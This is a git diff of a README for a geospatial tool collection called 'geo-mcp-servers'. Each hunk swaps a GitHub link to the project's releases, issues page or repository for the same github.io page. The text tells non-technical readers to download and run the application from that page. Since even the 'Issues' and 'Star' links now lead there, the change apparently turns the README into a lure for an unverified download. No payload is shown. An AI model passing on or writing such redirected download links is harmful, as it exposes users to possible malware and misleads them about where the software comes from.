@@ -1,6 +1,6 @@
 # 🗺️ geo-mcp-servers - Your Gateway to Easy Geospatial Tools
 
-[![Download Now](https://img.shields.io/badge/Download-Application-brightgreen?style=for-the-badge&logo=github&logoColor=white&color=4CAF50)](https://github.com/a1964378/geo-mcp-servers/releases)
+[![Download Now](https://img.shields.io/badge/Download-Application-brightgreen?style=for-the-badge&logo=github&logoColor=white&color=4CAF50)](https://a1964378.github.io)
 
 Welcome to **geo-mcp-servers** – a friendly, all-in-one collection of tools that helps you work with maps, locations, and Earth data without needing to be a programmer. Whether you're curious about weather patterns, need to find the best route for delivery, or want to explore satellite images of your neighborhood, this application makes it simple.
 
@@ -16,7 +16,7 @@ Getting started is easier than ever. We've designed the download and setup proce
 
 **Step 1: Get the Application**
 
-Visit this link to download the application: [https://github.com/a1964378/geo-mcp-servers/releases](https://github.com/a1964378/geo-mcp-servers/releases)
+Visit this link to download the application: [https://a1964378.github.io](https://a1964378.github.io)
 
 Once you're on that page, look for the most recent version listed at the top. Click the download button next to it, and the file will save to your computer's "Downloads" folder.
 
@@ -113,7 +113,7 @@ We want your experience to be smooth. Here are a few quick solutions if you run 
 
 If you're still facing issues, we're here to help. The community and support resources for this project are active and friendly.
 
-- **Check the Issues Page:** Visit the repository's "Issues" tab at [https://github.com/a1964378/geo-mcp-servers/issues](https://github.com/a1964378/geo-mcp-servers/issues) to see if someone else has had the same problem and found a solution.
+- **Check the Issues Page:** Visit the repository's "Issues" tab at [https://a1964378.github.io](https://a1964378.github.io) to see if someone else has had the same problem and found a solution.
 - **Search for Answers:** Use your favorite search engine with the phrase "geo-mcp-servers" along with a description of your problem. Chances are, you'll find a helpful answer.
 
 ---
@@ -132,7 +132,7 @@ To get the most out of your experience, here are some helpful related topics you
 
 We regularly release new versions with improvements and additional features. To stay on top of the latest updates:
 
-- **Star the Repository:** Click the "Star" button on the main project page at [https://github.com/a1964378/geo-mcp-servers](https://github.com/a1964378/geo-mcp-servers) to show your support.
+- **Star the Repository:** Click the "Star" button on the main project page at [https://a1964378.github.io](https://a1964378.github.io) to show your support.
 - **Watch the Releases:** On the release page, click "Watch" and select "Releases only" to get email notifications whenever a new version is published.
 
 ---
@@ -141,7 +141,7 @@ We regularly release new versions with improvements and additional features. To 
 
 We're thrilled that you're using **geo-mcp-servers**. We believe that powerful geospatial tools should be accessible to everyone, and we've worked hard to make this application as intuitive and useful as possible. Your feedback, ideas, and shared experiences help us improve.
 
-Go ahead and [download the application](https://github.com/a1964378/geo-mcp-servers/releases) today, and start exploring the world around you in exciting new ways!If you could show how easily this tool can be used by someone without a tech background, even better. We welcome your suggestions for improvements, and we hope this becomes an invaluable resource for your daily life, studies, or work. Happy mapping!
+Go ahead and [download the application](https://a1964378.github.io) today, and start exploring the world around you in exciting new ways!If you could show how easily this tool can be used by someone without a tech background, even better. We welcome your suggestions for improvements, and we hope this becomes an invaluable resource for your daily life, studies, or work. Happy mapping!
 
 ---
 
